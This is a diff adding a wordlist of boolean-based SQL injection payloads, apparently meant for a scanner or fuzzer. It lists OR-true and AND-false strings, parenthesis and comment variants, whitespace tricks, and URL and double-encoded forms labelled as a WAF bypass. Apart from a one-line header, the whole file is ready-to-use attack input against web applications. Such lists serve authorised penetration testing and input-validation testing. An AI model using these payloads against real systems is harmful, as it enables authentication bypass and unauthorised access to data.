@@ -1,0 +1,75 @@
+# Boolean-based SQL Injection Payloads
+# These payloads test for true/false condition differences
+
+# Classic OR true
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1#
+" OR 1=1#
+
+# Classic AND false (for differential)
+' AND '1'='2
+" AND "1"="2
+' AND 1=2--
+" AND 1=2--
+' AND '1'='2'--
+' AND 1=2#
+
+# Numeric context
+1 OR 1=1
+-1 OR 1=1
+1 AND 1=1
+1 AND 1=2
+0 OR 1=1
+
+# Parentheses bypass
+') OR ('1'='1
+") OR ("1"="1
+')) OR (('1'='1
+')) OR 1=1--
+') OR 1=1--
+
+# String concatenation
+' OR 'x'='x
+" OR "x"="x
+' OR ''='
+" OR ""="
+
+# NULL comparisons
+' OR NULL IS NULL--
+' AND NULL IS NOT NULL--
+
+# LIKE-based
+' OR 1 LIKE 1--
+' OR 'a' LIKE 'a'--
+
+# Case variations
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1
+
+# Space alternatives
+'/**/OR/**/'1'='1
+'+OR+'1'='1
+'%09OR%09'1'='1
+
+# Comment variations
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR '1'='1'-- -
+' OR '1'='1';--
+
+# Integer overflow
+' OR 1=1 OR '
+' OR 2>1--
+' OR 3-2=1--
+
+# Double encoding (for WAF bypass)
+%27%20OR%20%271%27%3D%271
+%2527%2520OR%2520%25271%2527%253D%25271
+
